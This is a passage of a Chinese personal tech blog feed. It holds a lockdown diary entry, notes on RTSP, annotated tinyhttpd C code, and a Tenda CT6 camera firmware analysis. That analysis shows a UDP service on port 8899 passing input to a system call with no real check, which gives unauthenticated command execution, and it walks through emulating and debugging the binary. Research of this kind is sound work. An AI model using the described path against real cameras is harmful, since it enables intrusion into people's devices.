src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VAY4BFQGOAQWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=b6fbe529def626514d856cc1c34fda63&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=jAhABowIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=cc711e8ed9decbff7c171c8aa071f5ca&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=xwdABscHQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=69e5ae34acdd4cc32acfe11ad63264b2&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p>哦对，女生说暂时不想谈恋爱是指不想跟你谈。记得不要死皮赖脸。</p><hr><p>哎呀终于解封了</p><p>属实是封了快一个月</p><p>让我来显摆一下封控时候搞得能吃的哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134775.jpeg" alt="IMG_1319"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135461.jpg" alt="IMG_1333"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081135009.jpg" alt="IMG_1369"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081134795.jpg" alt="IMG_1396"></p><p>我觉得还可以哈哈哈</p><p>人一旦宅久了，确实容易废。</p><p>哦对，今晚有月全食，小丫头跟我说那是血月不吉利。</p><p>开玩笑，我可是唯物主义战士。</p><p>每次碎碎念都有好多骚话，却总写不出来。</p><p>算了算了无所谓的。</p><p>最后分享下最近的壁纸吧</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138298.jpg" alt="100174471_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138274.jpg" alt="100191209_p0_master1200"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138266.jpg" alt="100789898_p0"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202211081138336.jpg" alt="101123738_p0"></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八的唠叨话</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tendaCT6摄像头固件分析</title>
    <link href="/article/77f90bb.html"/>
    <url>/article/77f90bb.html</url>
    
    <content type="html"><![CDATA[<p>最近逛tenda发现新上了一款摄像头，这不下载个固件看看？</p><p>直接binwalk一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271628718.png" alt="image-20220927162813264"></p><h2 id="firmAE"><a href="#firmAE" class="headerlink" title="firmAE"></a>firmAE</h2><p>这里先不看文件系统，尝试下用firmAE来模拟固件</p><blockquote><p>sudo .&#x2F;run.sh -c ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin  </p><p>需要使用root权限来执行firmAE文件夹下的run.sh，-c参数为check，来检查是否可以模拟，一般check完成后模拟起来会很快，但check很慢，ipc算是项目名字可定义即可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271737716.png" alt="image-20220927173707626"></p><blockquote><p>sudo .&#x2F;run.sh -d ipc &#x2F;mnt&#x2F;hgfs&#x2F;sharedir&#x2F;tenda&#x2F;ct6&#x2F;IPC_SD_update.bin  </p><p>check完成后可以使用 -a参数直接执行，或者-d参数以debug模式执行，debug模式</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281348543.png" alt="image-20220928134825377"></p><p>这个固件能模拟，但是不能完全模拟，知道用法就可了。</p><h2 id="如何找到一个固件的服务进行分析"><a href="#如何找到一个固件的服务进行分析" class="headerlink" title="如何找到一个固件的服务进行分析"></a>如何找到一个固件的服务进行分析</h2><p>当解包一个固件的时候发现，没有http服务，没有html页面，没有httpd，boa，uhttpd，lighttpd等。</p><p>某些摄像头经常见到这个问题。</p><p>这个时候需要从启动来一点点看找到他启动了什么服务。</p><p>当然如果有设备并且获取了串口shell，也可以直接查看</p><blockquote><p>这里推荐个超好用的命令 find </p><p>大概用法 </p><p>​    find . -name “httpd”</p><p>​     find . -name “*cfg”</p><p>支持*这样的正则匹配</p></blockquote><p>linux启动最先看inittab，一般在etc下面</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271716514.png" alt="image-20220927171626273"></p><p>启动rcS，一般都在&#x2F;etc&#x2F;init.d&#x2F;rcS</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271717140.png" alt="image-20220927171715008"></p><p>这里就是执行了init.d文件夹下的文件</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271718721.png" alt="image-20220927171849636"></p><p>S00devs 里使用mknod创建Linux中的符设备文件和块设备文件，不重要</p><p>S01udev 它主要的功能是管理&#x2F;dev目录底下的设备节点。它同时也是用来接替devfs及热插拔的功能，这意味着它要在添加&#x2F;删除硬件时处理&#x2F;dev目录以及所有用户空间的行为。也不重要</p><p>S80network中也并没有发现启动的服务</p><p>那返回到rcS，执行完S*之后，执行了&#x2F;opt&#x2F;app&#x2F;init.sh</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271734171.png" alt="image-20220927173417037"></p><p>但opt中没有任何文件，这个时候就需要上面说的find命令了。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271737692.png" alt="image-20220927173746511"></p><p>吧squashfs-root-0和-1的所有内容移动到opt下</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271740612.png" alt="image-20220927174017473"></p><p>运行network_setup.sh，启动telnet服务，将execute放到tmp，启动execute服务，运行daemon.sh</p><p>network_setup.sh中没有服务启动，不赘述</p><p>daemon.sh中执行了tdseq服务</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271747668.png" alt="image-20220927174748489"></p><p>从先后顺序来看，来分析个execute。</p><p>这里tenda摄像头设备基本都是armel，自行file即可</p><h2 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h2><p>main中可以看到socket函数（具体请看socket网络编程）</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271756484.png" alt="image-20220927175631357"></p><p>这里绑定了8899端口，但是并没有监听。启动下看看</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271804274.png" alt="image-20220927180401160"></p><p>发现8899的udp协议。</p><p>可以使用netcat连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271806829.png" alt="image-20220927180613667"></p><p>这里分析下udp协议做了什么</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271810531.png" alt="image-20220927181043433"></p><p>通过recvfrom获取到传入的内容存放到v13，创建新线程将内容传进去。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209271813448.png" alt="image-20220927181335304"></p><p>在线程中，吧参数给了v9，然后注意这个v17获取了前四位做了个判断。</p><p>以为是magicnumber，满足条件执行my_system，但是这个magicnumbe没有做任何奇奇怪怪的判断。</p><p>所以可以直接命令执行，但是还是好奇这个sub_10D64做了什么。</p><p>点进去？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281140262.png" alt="image-20220928114023047"></p><p>不是，脱裤子放屁都没这么放的吧。</p><p>开发者这么做，一定有他的用(大)意(病)</p><p>查了半天，也没发现这里if分支的区别。</p><p>这里应该算是个命令执行了。直接来吧（jitang）！</p><h2 id="qemu-user导致的问题"><a href="#qemu-user导致的问题" class="headerlink" title="qemu user导致的问题"></a>qemu user导致的问题</h2><p>这里本来使用的 sudo chroot . .&#x2F;qemu-arm-static .&#x2F;opt&#x2F;app&#x2F;execute 启动的，但是命令执行死活不成功。</p><p>gdb调试了一天，愣是没找到问题。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281154380.png" alt="image-20220928115439112"></p><p>第二天尝试了下qemu-arm-static -L . .&#x2F;opt&#x2F;app&#x2F;execute</p><p>可以了。。。，这里xxxx就是为了填充magic number，可以写脚本传入0x00来执行到sub函数。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281158099.png" alt="image-20220928115801001"></p><p>所以各位有时候遇到这种问题可以看一下是否是qemu的问题。</p><p>当然，如果像我一样，有一个同架构的其他设备，又刚好有该设备的rce，就可以搞点牛头人操作了。</p><h2 id="关于gdb多线程调试"><a href="#关于gdb多线程调试" class="headerlink" title="关于gdb多线程调试"></a>关于gdb多线程调试</h2><p>gdb多线程调试，大概说一下怎么搞。</p><p>使用qemu自带的-g参数启动远程server</p><blockquote><p> qemu-arm-static -L . -g 1234 .&#x2F;opt&#x2F;app&#x2F;execute # 1234为监听的端口</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281402057.png" alt="image-20220928140246774"></p><p>使用gdb-multiarch来进行调试</p><blockquote><p>gdb-multiarch opt&#x2F;app&#x2F;execute</p><p>target remote 127.0.0.1</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281407294.png" alt="image-20220928140716065"></p><p>在子线程函数中下个断点，我这边位置是0x000110E8</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281409052.png" alt="image-20220928140942865"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281409246.png" alt="image-20220928140953173"></p><p>使用c来执行程序</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281410262.png" alt="image-20220928141028136"></p><p>使用netcat连接udp</p><blockquote><p>nc -uvv 127.0.0.1 8899</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281411690.png" alt="image-20220928141124554"></p><p>连上后gdb中能发现新线程</p><blockquote><p>info threads</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281414198.png" alt="image-20220928141434051"></p><p>ID 2 就是断下来的心线程，使用thread 2来切换线程</p><blockquote><p>thread 2</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202209281415439.png" alt="image-20220928141540348"></p><p>此时pc指向我们的断点，要回主线程，只需要再次切换即可。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-rtsp</title>
    <link href="/article/ccd0d78.html"/>
    <url>/article/ccd0d78.html</url>
    
    <content type="html"><![CDATA[<p>最近在看摄像头，刚好碰到rtsp协议的东西，寻思学习记录下。</p><p>这里csdn的<a href="https://blog.csdn.net/weixin_42462202">JT同学</a>师傅的博客写的很不错。</p><p>rtsp是一个实时传输流协议，简单点说就是用来看视频的。</p><p>rtsp通常包括rtp，rtcp，rtsp</p><blockquote><p>rtsp负责客户端与服务端的请求和响应</p><p>rtcp负责在RTP传输过程中提供传输信息</p><p>rtp负责传输媒体数据</p><p>rtsp承载与rtp和rtcp之上，rtsp并不会发送媒体数据，而是使用rtp协议传输</p><p>rtp并没有规定发送方式，可以选择udp发送或者tcp发送</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220822110639937.png" alt="image-20220822110639937"></p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-tinyhttpd</title>
    <link href="/article/68d281b.html"/>
    <url>/article/68d281b.html</url>
    
    <content type="html"><![CDATA[<p>一个非常轻量的httpd服务器，只有500行代码。</p><p>我后边用python写了一个很简陋的几十行代码的，可以看下那个来简单看一下。</p><p>这里只看了网络编程的一些东西，进程通信挖个坑，下次填。</p><p>很适合</p><blockquote><p><a href="https://github.com/EZLippi/Tinyhttpd.git">https://github.com/EZLippi/Tinyhttpd.git</a></p><p>编译方式是直接make</p></blockquote><p>编译执行后发现开启4000端口</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720153445595.png" alt="image-20220720153445595"></p><p>默认加载htdocs下的index.html</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720154305858.png" alt="image-20220720154305858"></p><p>当去访问一个不存在的文件a.html</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720154327199.png" alt="image-20220720154327199"></p><p>cgi问题</p><p>这里写一个简单的shell cgi来替代自带的cgi</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-Type: text/html&quot;</span><span class="hljs-built_in">echo</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;HTML&gt;&lt;BODY&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;CENTER&gt;Today is:&lt;/CENTER&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;CENTER&gt;&lt;B&gt;&quot;</span><span class="hljs-built_in">date</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span></code></pre></div><p>访问cgi文件，发现cgi并未被执行</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720160433477.png" alt="image-20220720160433477"></p><p>是因为没有执行权限，所以导致直接被当成静态文件，而有执行权限的话，静态文件也会被当作cgi执行。</p><p>尝试将所有的文件赋予权限</p><blockquote><p>chmod 777 .&#x2F;*</p></blockquote><p>index页面无法正常显示</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720155641576.png" alt="image-20220720155641576"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720160541100.png" alt="image-20220720160541100"></p><p>执行方式可以通过下图来理解</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220720152650036.png" alt="image-20220720152650036"></p><h2 id="注释代码"><a href="#注释代码" class="headerlink" title="注释代码"></a>注释代码</h2><p>项目放代码阅读时的代码放gitee了需要可自行下载：<a href="https://gitee.com/p1piyang/backward-analysis/">https://gitee.com/p1piyang/backward-analysis/</a></p><div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* J. David&#x27;s webserver */</span><span class="hljs-comment">/* This is a simple webserver.</span><span class="hljs-comment"> * Created November 1999 by J. David Blackstone.</span><span class="hljs-comment"> * CSE 4344 (Network concepts), Prof. Zeigler</span><span class="hljs-comment"> * University of Texas at Arlington</span><span class="hljs-comment"> */</span><span class="hljs-comment">/* This program compiles for Sparc Solaris 2.6.</span><span class="hljs-comment"> * To compile for Linux:</span><span class="hljs-comment"> *  1) Comment out the #include &lt;pthread.h&gt; line.</span><span class="hljs-comment"> *  2) Comment out the line that defines the variable newthread.</span><span class="hljs-comment"> *  3) Comment out the two lines that run pthread_create().</span><span class="hljs-comment"> *  4) Uncomment the line that runs accept_request().</span><span class="hljs-comment"> *  5) Remove -lsocket from the Makefile.</span><span class="hljs-comment"> */</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ISspace(x) isspace((int)(x))</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_STRING <span class="hljs-string">&quot;Server: jdbhttpd/0.1.0\r\n&quot;</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDIN   0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDOUT  1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> STDERR  2</span><span class="hljs-type">void</span> <span class="hljs-title function_">accept_request</span><span class="hljs-params">(<span class="hljs-type">void</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">bad_request</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">cat</span><span class="hljs-params">(<span class="hljs-type">int</span>, FILE *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">cannot_execute</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">error_die</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">execute_cgi</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">int</span> <span class="hljs-title function_">get_line</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> *, <span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">headers</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">not_found</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *)</span>;<span class="hljs-type">int</span> <span class="hljs-title function_">startup</span><span class="hljs-params">(u_short *)</span>;<span class="hljs-type">void</span> <span class="hljs-title function_">unimplemented</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* A request has caused a call to accept() on the server port to</span><span class="hljs-comment"> * return.  Process the request appropriately.</span><span class="hljs-comment"> * Parameters: the socket connected to the client */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">accept_request</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;    <span class="hljs-type">int</span> client = (<span class="hljs-type">intptr_t</span>)arg;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-type">size_t</span> numchars;    <span class="hljs-type">char</span> method[<span class="hljs-number">255</span>];    <span class="hljs-type">char</span> url[<span class="hljs-number">255</span>];    <span class="hljs-type">char</span> path[<span class="hljs-number">512</span>];    <span class="hljs-type">size_t</span> i, j;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span> <span class="hljs-comment">//文件信息</span>    <span class="hljs-comment">//struct stat&#123;</span>        <span class="hljs-comment">//   dev_t     st_dev;     /* ID of device containing file */文件使用的设备号</span>        <span class="hljs-comment">//   ino_t     st_ino;     /* inode number */    索引节点号 </span>        <span class="hljs-comment">//   mode_t    st_mode;    /* protection */  文件对应的模式，文件，目录等</span>        <span class="hljs-comment">//   nlink_t   st_nlink;   /* number of hard links */    文件的硬连接数  </span>        <span class="hljs-comment">//   uid_t     st_uid;     /* user ID of owner */    所有者用户识别号</span>        <span class="hljs-comment">//   gid_t     st_gid;     /* group ID of owner */   组识别号  </span>        <span class="hljs-comment">//   dev_t     st_rdev;    /* device ID (if special file) */ 设备文件的设备号</span>        <span class="hljs-comment">//   off_t     st_size;    /* total size, in bytes */ 以字节为单位的文件容量   </span>        <span class="hljs-comment">//   blksize_t st_blksize; /* blocksize for file system I/O */ 包含该文件的磁盘块的大小   </span>        <span class="hljs-comment">//   blkcnt_t  st_blocks;  /* number of 512B blocks allocated */ 该文件所占的磁盘块  </span>        <span class="hljs-comment">//   time_t    st_atime;   /* time of last access */ 最后一次访问该文件的时间   </span>        <span class="hljs-comment">//   time_t    st_mtime;   /* time of last modification */ /最后一次修改该文件的时间   </span>        <span class="hljs-comment">//   time_t    st_ctime;   /* time of last status change */ 最后一次改变该文件状态的时间   </span>        <span class="hljs-comment">//&#125;;</span>    <span class="hljs-type">int</span> cgi = <span class="hljs-number">0</span>;      <span class="hljs-comment">/* becomes true if server decides this is a CGI</span><span class="hljs-comment">                       * program */</span>    <span class="hljs-type">char</span> *query_string = <span class="hljs-literal">NULL</span>;    <span class="hljs-comment">//读取http请求的第一行数据</span>    numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));    i = <span class="hljs-number">0</span>; j = <span class="hljs-number">0</span>;    <span class="hljs-comment">//吧请求方法存到，，method中</span>    <span class="hljs-keyword">while</span> (!ISspace(buf[i]) &amp;&amp; (i &lt; <span class="hljs-keyword">sizeof</span>(method) - <span class="hljs-number">1</span>))    &#123;        method[i] = buf[i];        i++;    &#125;    j=i;    method[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-comment">//判断如果不是get或者post方法，发送response给客户端表示无法实现</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>))    &#123;        <span class="hljs-comment">//使用sprintf函数将要返回的内容给buf,使用send函数返回给client</span>        unimplemented(client);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">//判断为post方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;POST&quot;</span>) == <span class="hljs-number">0</span>)        cgi = <span class="hljs-number">1</span>;    i = <span class="hljs-number">0</span>;    <span class="hljs-comment">//跳过空格</span>    <span class="hljs-keyword">while</span> (ISspace(buf[j]) &amp;&amp; (j &lt; numchars))        j++;    <span class="hljs-comment">//获取url</span>    <span class="hljs-keyword">while</span> (!ISspace(buf[j]) &amp;&amp; (i &lt; <span class="hljs-keyword">sizeof</span>(url) - <span class="hljs-number">1</span>) &amp;&amp; (j &lt; numchars))    &#123;        url[i] = buf[j];        i++; j++;    &#125;    url[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-comment">//get方法</span>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>) == <span class="hljs-number">0</span>)    &#123;        query_string = url;        <span class="hljs-comment">//用于记录带参数的GET方法请求中 ‘？’后的参数</span>        <span class="hljs-keyword">while</span> ((*query_string != <span class="hljs-string">&#x27;?&#x27;</span>) &amp;&amp; (*query_string != <span class="hljs-string">&#x27;\0&#x27;</span>))            query_string++;        <span class="hljs-keyword">if</span> (*query_string == <span class="hljs-string">&#x27;?&#x27;</span>)        &#123;            cgi = <span class="hljs-number">1</span>;            *query_string = <span class="hljs-string">&#x27;\0&#x27;</span>;            query_string++;        &#125;    &#125;    <span class="hljs-comment">//将htdocs与url拼接到一起给path，即我们的资源文件都在htdocs下</span>    <span class="hljs-built_in">sprintf</span>(path, <span class="hljs-string">&quot;htdocs%s&quot;</span>, url);    <span class="hljs-comment">//判断如果URL的最后一位是‘/’，加上index.html</span>    <span class="hljs-keyword">if</span> (path[<span class="hljs-built_in">strlen</span>(path) - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;/&#x27;</span>)        <span class="hljs-built_in">strcat</span>(path, <span class="hljs-string">&quot;index.html&quot;</span>);    <span class="hljs-comment">//定义函数：int stat(const char * file_name, struct stat *buf);</span>    <span class="hljs-comment">//函数说明：stat()用来将参数file_name 所指的文件状态, 复制到参数buf 所指的结构中。</span>    <span class="hljs-comment">//返回值：执行成功则返回0，失败返回-1，错误代码存于errno。 </span>    <span class="hljs-comment">//这里改了一下，把东西处理下可以看到是处理包头。</span>    <span class="hljs-comment">//根据执行来看，这个if判断</span>    <span class="hljs-keyword">if</span> (stat(path, &amp;st) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-keyword">while</span> ((numchars &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;\n&quot;</span>, buf))  <span class="hljs-comment">/* read &amp; discard headers */</span>        &#123;            numchars = get_line(client, buf, <span class="hljs-keyword">sizeof</span>(buf));            <span class="hljs-type">char</span> *test = buf;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;for: %s&quot;</span>, test);        &#125;        <span class="hljs-comment">//打印404返回页面</span>        not_found(client);    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-comment">// 文件存在，那则跟常量S_IFMT相与，相与之后的值可以用来判断该文件是什么类型的</span>        <span class="hljs-comment">// 此处与上边判断路径是不是以 \ 结尾的地方作用一样，可以省略，留着可重复确认。</span>        <span class="hljs-keyword">if</span> ((st.st_mode &amp; S_IFMT) == S_IFDIR)            <span class="hljs-built_in">strcat</span>(path, <span class="hljs-string">&quot;/index.html&quot;</span>);        <span class="hljs-comment">//判断权限的，前面有说过的</span>        <span class="hljs-keyword">if</span> ((st.st_mode &amp; S_IXUSR) ||                (st.st_mode &amp; S_IXGRP) ||                (st.st_mode &amp; S_IXOTH)    )            cgi = <span class="hljs-number">1</span>;        <span class="hljs-keyword">if</span> (!cgi)        &#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nocgi\n&quot;</span>);            <span class="hljs-comment">//不需要cgi的</span>            serve_file(client, path);        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">//需要cgi的</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cgi\n&quot;</span>);            execute_cgi(client, path, method, query_string);        &#125;    &#125;    close(client);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that a request it has made has a problem.</span><span class="hljs-comment"> * Parameters: client socket */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">bad_request</span><span class="hljs-params">(<span class="hljs-type">int</span> client)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;HTTP/1.0 400 BAD REQUEST\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;Content-type: text/html\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;&lt;P&gt;Your browser sent a bad request, &quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);    <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;such as a POST without a Content-Length.\r\n&quot;</span>);    send(client, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>);&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Put the entire contents of a file out on a socket.  This function</span><span class="hljs-comment"> * is named after the UNIX &quot;cat&quot; command, because it might have been</span><span class="hljs-comment"> * easier just to do something like pipe, fork, and exec(&quot;cat&quot;).</span><span class="hljs-comment"> * Parameters: the client socket descriptor</span><span class="hljs-comment"> *             FILE pointer for the file to cat */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">cat</span><span class="hljs-params">(<span class="hljs-type">int</span> client, FILE *resource)</span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];    <span class="hljs-comment">//读取文件内容，发送到前端。</span>    fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), resource);    <span class="hljs-keyword">while</span> (!feof(resource))    &#123;        send(client, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>);        fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), resource);    &#125;&#125;<span class="hljs-comment">/**********************************************************************/</span><span class="hljs-comment">/* Inform the client that a CGI script could not be executed.</span><span class="hljs-comment"> * Parameter: the client socket descriptor. */</span><span class="hljs-comment">/**********************************************************************/</span><span class="hljs-type">void</span> <span class="hljs-title function_">cannot_execute</span><span class="hljs-params">(<span class="hljs-type">int</span> 